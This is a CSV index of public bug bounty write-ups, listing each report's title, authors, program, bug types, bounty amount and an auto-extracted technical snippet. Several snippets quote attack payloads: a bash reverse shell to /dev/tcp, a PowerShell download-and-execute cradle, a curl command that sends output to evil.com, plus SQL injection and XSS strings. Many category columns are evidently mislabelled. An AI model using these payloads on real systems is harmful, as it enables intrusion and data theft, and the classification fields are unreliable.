Title,URL,Authors,Programs,Bugs,Bounty,PublicationDate,AddedDate,functionality,vulnerability_type,execution_context,attack_vector,language_or_framework,impact,technical_details
Finding 0day to hack Apple,https://httpvoid.com/Apple-RCE.md,"Harsh Jaiswal (@rootxharsh), Rahul Maini (@iamnoooob)","Apple, Lucee","RCE, ColdFusion",50000,1/16/21,9/15/22,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
CVE-2021-44142: Details On A Samba Code Execution Bug Demonstrated At Pwn2Own Austin,https://www.zerodayinitiative.com/blog/2022/2/1/cve-2021-44142-details-on-a-samba-code-execution-bug-demonstrated-at-pwn2own-austin,"Nguyễn Hoàng Thạch (@hi_im_d4rkn3ss), Billy Jheng Bing-Jhong (@st424204)",-,"Memory corruption, RCE",45000,2/1/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,.NET,Full System Compromise,Payload not explicitly detailed
CVE-2022-29844: A Classic Buffer Overflow On The Western Digital My Cloud Pro Series PR4100,https://www.zerodayinitiative.com/blog/2023/4/19/cve-2022-29844-a-classic-buffer-overflow-on-the-western-digital-my-cloud-pro-series-pr4100,Luca Moro (@johncool__),Western Digital,"Buffer Overflow, Memory corruption, RCE",40000,4/20/23,4/24/23,Imports/Sharing,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,Payload not explicitly detailed
Microsoft Edge (Chromium) - EoP via XSS to Potential RCE,https://leucosite.com/Edge-Chromium-EoP-RCE/,Abdulrahman Alqabandi (@Qab),Microsoft,"XSS, RCE",40000,12/24/19,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Full System Compromise,using a POST request to 'technology.za.msn.com' within a hidden 'IFRAME' 'IFRAME' loads after ~42 seconds and XSS payload is triggered in 'technology.za.msn.com' The XSS in 'technology.za.msn.com' creates a cookie with 'domain=.msn.com' directive and named 'domainId' that contains our second payload Victim is redirected to a broken NTP page 'https://ntp.msn.com/compass/antp?locale=qab&dsp=1&sp=qab
$36k Google App Engine RCE,https://web.archive.org/web/20180523180902/https://sites.google.com/site/testsitehacking/-36k-google-app-engine-rce,Ezequiel Pereira (@epereiralopez),Google,RCE,36337,5/20/18,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
Subdomain Fuzzing worth 35k bounty!,https://medium.com/@HX007/subdomain-fuzzing-worth-35k-bounty-daebcb56d9bc,"Abdullah Nawaf / HX007, Orwa Atyat (@GodfatherOrwa)",-,"RCE, Authentication bypass, SQL injection",35000,3/18/24,5/8/24,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,Payload not explicitly detailed
How I made more than $30K with Jolokia CVEs,https://wss.sh/en/blog/how-i-made-more-than-30k-with-jolokia-cves/,Patrik Fehrenbach (@ITSecurityguard),-,"Reflected XSS, RCE, Information disclosure",33500,6/16/20,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"like `<svg%20onload=alert(document.cookie)>` will be interpreted as valid Javascript. This was remediated by only allowing the mime types of `text/plain` and `application/json` as a means of preventing attacks using Javascript. To quickly check if the target is vulnerable to this Cross-Site Scripting attack, simply visit the following path on your target: `https://<target>/api/jolokia/read<svg%20o"
RCE in Google Cloud Deployment Manager,https://www.ezequiel.tech/2020/05/rce-in-cloud-dm.html,Ezequiel Pereira (@epereiralopez),Google,"SSRF, RCE",31337,5/21/20,9/15/22,Imports/Sharing,Server-Side Template Injection (SSTI),Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
"I Own your Cloud Shell: Taking over “Azure Cloud Shell” Kubernetes Cluster Through Unsecured Kubelet API 30,000$ Bounty",https://hencohen10.medium.com/i-own-your-cloud-shell-taking-over-azure-cloud-shell-kubernetes-cluster-through-unsecured-558621519cf9,Chen Cohen (@chencococococo),Microsoft,"Privilege escalation, RCE",30000,2/15/21,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Python,Shell/Command Execution,"#bash -i >& /dev/tcp/i.p.a.d.d.r.e.s.s/p.o.r.t 0>&12. Executing the reverse shellin order to get reverse shell executed, I repeated the same procedure for creating the hello_world file in “/tmp”, (remember — commands sent through the kubelet API, runs in the context of the root user):curl — insecure -v -H “X-Stream-Protocol-Version: v2.channel.k8s.io” -H “X-Stream-Protocol-Version: channel.k8s.io”"
Popping a shell on the Oculus developer portal,https://bitquark.co.uk/blog/2014/08/31/popping_a_shell_on_the_oculus_developer_portal,Bitquark (@bitquark),Meta / Facebook,"SQL injection, CSRF, RCE, IDOR",30000,8/31/14,9/15/22,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,Payload not explicitly detailed
EmojiDeploy: Smile! Your Azure web service just got RCE’d ._.,https://ermetic.com/blog/azure/emojideploy-smile-your-azure-web-service-just-got-rced/,Liv Matan (@terminatorLM),Microsoft (Azure),"RCE, Cloud, CSRF, CORS misconfiguration",30000,1/19/23,1/23/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,.NET,Shell/Command Execution,to the victim's Azure application.ImpactEmojiDeploy allows remote code execution and a full takeover of the targeted application:Running code and commands as the www userTheft or deletion of sensitive dataPhishing campaignsTakeover of the app’s managed identity and lateral movement to other Azure servicesThe vulnerability enables RCE and full takeover of the target app. The impact of the vulnerabi
The 30000$ Bounty Affair.,https://medium.com/@gokulsspace/the-30000-bounty-affair-3f025ee6b834,Gokulsspace (@GokTest),-,"RCE, Missing authentication, Exposed Jenkins instance",30000,5/28/23,5/29/23,Imports/Sharing,Command Injection,CI/CD Pipeline RCE,Web Application Parameter,NodeJS,Shell/Command Execution,Payload not explicitly detailed
"GitHub Pages - Multiple RCEs via insecure Kramdown configuration - $25,000 Bounty",https://devcraft.io/2020/10/20/github-pages-multiple-rces-via-kramdown-config.html,William Bowling / vakzz (@wcbowling),GitHub,"RCE, Path traversal",25000,10/20/20,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Full System Compromise,and confirmed that the same thing happened. Next thing was to work out how to get controllable ruby file to a known location so that it could be used as the payload. I used opensnoop from perf-tools and watched the paths as github built the jekyll site and saw that the following directories were being used: /data/user/tmp/pages/page-build-23481 /data/user/tmp/pages/pagebuilds/vakzz/jekyll1
How I got $24000 Bounty from a Log4j RCE in Apple App Store.,https://medium.com/@meharhuzaifa777/exploiting-log4j-rce-in-apple-app-store-ca99a549de1f,Mehar huzaifa (@Hunter_Huzaifa_),Apple,"RCE, Components with known vulnerabilities",24000,8/25/24,8/26/24,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"in the city input field and proceeded to change my region. Initially, nothing seemed to happen 😟 , and I didn’t receive any indication that the payload had triggered.Later that evening, I went to the App Store to download a game. As the game began downloading, I unexpectedly received an email notification from my server indicating that the Log4j payload had been triggered 🙂.Intriguingly, the email"
CS:GO: From Zero to 0-day,https://neodyme.io/blog/csgo_from_zero_to_0day/,"Felipe, Alain",Valve (CS:GO),"Game hacking, RCE, Memory corruption, Arbitrary file download, Arbitrary file write, DLL Hijacking, Privilege escalation",22500,5/13/23,5/15/23,File Management,Command Injection,Server-side RCE,Web Application Parameter,Python,Shell/Command Execution,"(POC) exploit that leverages four different logic bugs into remote code execution in the game’s client, triggered when a client connects to the server. Introduction¶ The CS:GO patch dated 04/28/2021 fixed several critical vulnerabilities, including three critical bugs from us. This post describes our approach and how we discovered three critical vulnerabilities. We present a single bug chain, cons"
"GitHub - RCE via git option injection (almost) - $20,000 Bounty",https://devcraft.io/2020/10/18/github-rce-git-inject.html,William Bowling / vakzz (@wcbowling),GitHub,RCE,20000,10/18/20,9/15/22,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
"Two Lines Of JScript For $20,000 – Pwn2Own Miami 2022",https://trenchant.io/two-lines-of-jscript-for-20000-pwn2own-miami-2022/,Ben McBride (@bdmcbri),ICONICS,RCE,20000,9/29/22,10/4/22,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
Hello Lucee! Let us hack Apple again?,https://blog.projectdiscovery.io/hello-lucee-let-us-hack-apple-again/,"Harsh Jaiswal (@rootxharsh), Rahul Maini (@iamnoooob)","Apple, Lucee","RCE, Insecure deserialization, ColdFusion, Security code review",20000,2/15/24,2/27/24,Imports/Sharing,Insecure Deserialization,Server-side RCE,Web Application Parameter,Java,Full System Compromise,"used earlier for CFMLExpressionInterpreter.interpret() calls didn't execute imageRead(). After reviewing parse(), We realized that the payload needed to be modified to x[imageRead('')] due to the call being made to CFMLExpressionInterpreter.interpretPart() after splitting the string from [ and it worked. imageRead() executed. We can call arbitrary functions from StrucGet("""").This led us to conclud"
ExifTool CVE-2021-22204 - Arbitrary Code Execution,https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html,William Bowling / vakzz (@wcbowling),GitLab,RCE,20000,5/4/21,9/15/22,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"that would trigger the eval: $ exiftool -v10 ./t/images/ExifTool.tif ...   | 19) Predictor = 1   |     - Tag 0x013d (2 bytes, int16u[1]):   |         00f6: 00 01                                           [..]   | 20) HasselbladExif = AT&TFORM.DJVUANTa..(metadata.    (Author ""\."" . return `date`; #"")   |     - Tag 0xc51b (284 bytes, int32u[71] read as undef[284]):   |         0184: 41 54 26 54 46 4"
"How we broke PHP, hacked Pornhub and earned $20,000",https://web.archive.org/web/20220709205125/https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/,"Ruslan Habalov (@evonide), cutz, Dario Weißer (@haxonaut)",PornHub,"RCE, Memory corruption, Use-After-Free",20000,7/23/16,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"we could force unserialize to create many empty arrays and free them once it terminated. When initializing an array PHP consecutively allocates memory for its zval and hashtable. One default hashtable entry for empty arrays is the uninitialized_bucket symbol. Overall, we were able to obtain a memory fragment that looked similar to the following:"
"Microsoft Dynamics Container Sandbox RCE via Unauthenticated Docker Remote API 20,000$ Bounty",https://hencohen10.medium.com/microsoft-dynamics-container-sandbox-rce-via-unauthenticated-docker-remote-api-20-000-bounty-7f726340a93b,Chen Cohen (@chencococococo),Microsoft,RCE,20000,6/1/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,.NET,Shell/Command Execution,"to the server via the Docker Remote APIThe next step is to create a reverse shell payload (I used Powercat for this mission, because whenever I tried a simple payloads such as msfvenom or other known payloads, they were deleted from the server by Microsoft Defender.)2.1: Create a text file with the following content:IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubuserconten"
Trying to hack Redis via HTTP requests,https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html,Nicolas Grégoire (@Agarri_FR),Meta / Facebook,"SSRF, CRLF injection, RCE",20000,9/11/14,2/6/24,Admin/Config Panel,Unrestricted File Write/Upload,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"in the database       SET payload ""could be php or shell or whatever"""
Liferay revisited: A tale of 20k$,https://vsrc.vng.com.vn/blog/liferay-revisited-a-tale-of-20k/,VNG Security Response Center (@vngsecresponse),-,RCE,20000,8/6/22,9/15/22,Imports/Sharing,Insecure Deserialization,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,that let us traverse back to the base context of Liferay instead of “/web/aviva” and then reach a vulnerable endpoint like “/api/liferay” or “/api/jsonws/”. But this asset is protected by Akamai WAF - it is way too good to block common bypasses like: /o/..;/api/liferay /o/..;/api/jsonws/invoke /api;/liferay /api;/jsonws/invoke
Google Extensions (Awarded $18833.7),https://ndevtk.github.io/writeups/2023/08/18/extensions/,NDevTK (@ndevtk),"Google, Proton AG","RCE, Information disclosure, SOP bypass, postMessage, XSS, Universal XSS",18833.7,8/18/23,8/21/23,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"to a victim who has the Form Troubleshooter 9 extension installed. Once the victim opens the link, the attacker’s page will be able to get the document tree of any web page that does not have an explicit Cross-Origin-Opener-Policy header (via window.open) OR that does not prevent being framed (iframe)."
"Uber Hacking: How we found out who you are, where you are and where you went",https://medium.com/@r0t1v/uber-hacking-how-we-found-out-who-you-are-where-you-are-and-where-you-went-1e0769674535,Vitor “r0t” Oliveira (@r0t1v),Uber,"Bruteforce, Information disclosure, Logic flaw, IDOR",18000,6/24/16,9/15/22,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
KindleDrip — From Your Kindle’s Email Address to Using Your Credit Card,https://medium.com/realmodelabs/kindledrip-from-your-kindles-email-address-to-using-your-credit-card-bb93dbfb2a08,Yogev Bar-On,Amazon,RCE,18000,1/21/21,9/15/22,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,changes the boot background and restarts the device.The attacker receives private credentials from the device and logs in to the victim’s account.Timeline• Oct 17th 2020: Report sent through the Amazon Vulnerability Research Program.• Oct 19th 2020: Amazon acknowledges the issues.• Nov 4th 2020: Rewarded 12K$ bounty.• Nov 11th 2020: Rewarded an additional 6K$ bounty from the Amazon Vulnerability R
"5 RCEs in npm for $15,000",https://robertchen.cc/blog/2021/09/20/npm-rce,"Robert Chen (@NotDeGhost), Philip",-,RCE,15000,9/20/21,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,NodeJS,Shell/Command Execution,can be generated from a bash script with:#!/bin/sh
$15k RCE Through Monitoring Debug Mode,https://medium.com/@0xold/15k-rce-through-monitoring-debug-mode-4f474d8549d5,Omar (@0x0ld),-,"RCE, LFI, Debug mode enabled",15000,8/28/24,9/4/24,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,Payload not explicitly detailed
Just Gopher It: Escalating a Blind SSRF to RCE for $15k,https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530,SirLeeroyJenkins (@SirLeeroyJenkin),-,"SSRF, RCE",15000,5/17/21,9/15/22,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"in the request directly resulted in a server error, so I set up my redirect server like the following to test if gopher would work via a redirect:python3 302redirect.py port “gopher://mycollaboratorurl/”Then again, submitted the request to my server —GET /xxx/logoGrabber?url=http://my302redirectserver/Host: mail.yahoo.com...To my surprise, it was successful — the redirect was followed and the I go"
"Bounty Evaluation GitHub = $15,000 US Dollars | Rate Limit",https://medium.com/@taniyatesting11/bounty-evaluation-github-15-000-us-dollars-rate-limit-d6c07d73c948,Taniya Agarwal,GitHub,"Bruteforce, Email verification bypass, Account takeover",15000,12/28/21,9/15/22,Admin/Config Panel,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,"type to number. I also configured the payload position. If you don’t know the working of the burpsuite, you can checkout learning module BurpSuite@ TryHackMe here: https://tryhackme.com/module/learn-burp-suiteInteresting information about this attack was the developer had configured single parameter for each OTP number. Essentially, it means that the there were 6 paramters in total for 6 digit OTP"
Simple Remote Code Execution Vulnerability Examples for Beginners,https://ozguralp.medium.com/simple-remote-code-execution-vulnerability-examples-for-beginners-985867878311,Ozgur Alp (@ozgur_bbh),-,"RCE, Unrestricted file upload",15000,2/5/20,9/15/22,File Management,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"Processing -> Match/Replace ruleAccessing the shell from root directory afterwardsPlease note that, this vulnerability is found on a target which was active for 2 weeks at least. Payout was around 3k.#Example 2— Unrestricted File Upload 2On a web system I was testing, I found a web form which was not existing on the web application site map or UI at all within the help of Google Dorks such as sear"
How i made 15k$ from Remote Code Execution Vulnerability,https://amakki.me/how-i-made-15k-from-remote-code-execution-vulnerability-2e1b14b3902a,Abdulrahman Makki (@AMakki1337),-,"Code injection, RCE, Self-XSS",15000,2/13/22,9/15/22,unknown,unknown,unknown,unknown,unknown,unknown,could not extract
"I figured out a way to hack any of Facebook’s 2 billion accounts, and they paid me a $15,000 bounty for it",https://medium.freecodecamp.org/responsible-disclosure-how-i-could-have-hacked-all-facebook-accounts-f47c0252ae4d,Anand Prakash (@anandpraka_sh),Meta / Facebook,"Bruteforce, Account takeover",15000,2/9/18,9/15/22,CI/CD Pipeline,Command Injection,CI/CD Pipeline RCE,Web Application Parameter,PHP,Shell/Command Execution,"video of the hack As you can see in the video, I was able to set a new password for the user by brute forcing the code which was sent to their email address and phone number. Vulnerable request POST /recover/as/code/ HTTP/1.1 Host: beta.facebook.com lsd=AVoywo13&n=XXXXX Brute forcing the “n” successfully allowed me to set new password for any Facebook user. Disclosure Timeline Feb 22nd, 2016 : Rep"
Poppin shells with Okta Verify on Windows,https://www.securifera.com/blog/2024/05/02/okta-verify-for-windows-remote-code-execution-cve-2024-0980/,b0yd (@rwincey),Okta,"RCE, DLL Hijacking, Local Privilege Escalation",13337,5/2/24,7/15/24,File Management,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,"looks something like the script below. Copy to ClipboardSyntax Highlightersha256_hash = hashlib.sha256() sha256_hash.update(""AAAAA"") lib_hash = sha256_hash.hexdigest() payload_name = ""test.txt"""
Critical Security Flaw Found in WhatsApp Desktop Platform Allowing Cybercriminals Read From The File System Access,https://www.perimeterx.com/tech-blog/2020/whatsapp-fs-read-vuln-disclosure/,Gal Weizman (@WeizmanGal),Meta / Facebook,"Stored XSS, CSP bypass, Open redirect, RCE",12500,2/4/20,9/15/22,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
"How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!",https://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html,Orange Tsai (@orange_8361),GitHub,"SSRF, RCE, CRLF injection, Insecure deserialization",12500,7/28/17,9/15/22,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,Generic Linux,Shell/Command Execution,Payload not explicitly detailed
CVE-2019-18426 - WhatsApp Vulnerabilities Disclosure - Open Redirect + CSP Bypass + Persistent XSS + FS read permissions + potential for RCE,https://weizman.github.io/2020/02/14/whatsapp-vuln/,Gal Weizman (@WeizmanGal),Meta / Facebook (WhatsApp),"RCE, Stored XSS, CSP bypass, Arbitrary file read, Open redirect, Security code review",12500,2/14/20,5/4/23,Imports/Sharing,Command Injection,Desktop App RCE,Web Application Parameter,Java,Service Disruption (DoS),"is not a visible part of the message. This is because WhatsApp has a part in their code that checks whether the content of the link URI is included in the body of the message when the messages are being loaded. If there is no match, WhatsApp will omit the banner and the exploit won’t work. The best I managed to achieve was to create a long enough message, so the “Read more..” feature would turn on"
Twitter's Vine Source code dump - $10080,https://avicoder.me/2016/07/22/Twitter-Vine-Source-code-dump/,avicoder (@avicoder),Twitter,"Source code disclosure, Information disclosure",10080,7/22/16,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
"CVE-2022-41924 - RCE in Tailscale, DNS Rebinding, and You",https://emily.id.au/tailscale,"Jamie McClymont (@JJJollyjim), Emily Trau (@emilyposting_)",Tailscale,"RCE, DNS rebinding, Information disclosure",10000,11/22/22,11/30/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
RCE In Adobe Acrobat Reader For Android(CVE-2021-40724),https://hulkvision.github.io/blog/post1/,sunny (@hulkvision),"Google, Adobe","RCE, Path traversal, Android",10000,1/14/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,# Vulnerability Fix !
PII Disclosure of Apple Users ($10k),https://ahmdhalabi.medium.com/pii-disclosure-of-apple-users-10k-d1e3d29bae36,Ahmad Halabi (@Ahmad_Halabi_),Apple,"IDOR, Lack of rate limiting, Bruteforce, Information disclosure",10000,7/7/22,9/15/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,Java,Shell/Command Execution,Payload not explicitly detailed
From Zero to Hero Part 1: Bypassing Intel DCM’s Authentication by Spoofing Kerberos and LDAP Responses (CVE-2022-33942),https://www.rcesecurity.com/2022/11/from-zero-to-hero-part-1-bypassing-intel-dcms-authentication-cve-2022-33942/,Julien Ahrens (@MrTuxracer),Intel,"Authentication bypass, Kerberos, RCE, Privilege escalation, Security code review",10000,11/23/22,11/25/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Full System Compromise,#NAME?
From Zero to Hero Part 2: From SQL Injection to RCE on Intel DCM (CVE-2022-21225),https://www.rcesecurity.com/2022/12/from-zero-to-hero-part-2-intel-dcm-sql-injection-to-rce-cve-2022-21225/,Julien Ahrens (@MrTuxracer),Intel,"SQL injection, Kerberos, RCE, Privilege escalation, Security code review",10000,12/1/22,12/20/22,Imports/Sharing,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"in the dataName parameter. Since DCM uses PostgreSQL a simple PG_SLEEP command can confirm the injection: {""antiCSRFId"":""0C39C25FF37ABE58191709BEDC62593B"",""requestObj"":{""snapshotId"":5,""roomId"":12,""dataName"":""test');SELECT PG_SLEEP(5)--""}} This results in a database sleep of 5 seconds:"
$10.000 bounty for exposed .git to RCE,https://medium.com/@levshmelevv/10-000-bounty-for-exposed-git-to-rce-304c7e1f54,Lev Shmelev,-,".git folder disclosure, RCE, OS command injection",10000,2/27/23,2/28/23,General Application Logic,Command Injection,Server-side RCE,Web Application Parameter,PHP,Shell/Command Execution,"for id command:someusr; curl https://evil.com/$(id|base64|tr -d “\n”);So it only remained to upload the shell, the only obstacle was the lack of write rights to the current directory, so the shell was uploaded to uploads/(to generate the shell, I used the weevely tool)If describe this process in steps:Save the shell locally in txt to be able to transfer it via curl, and raise the server on own hos"
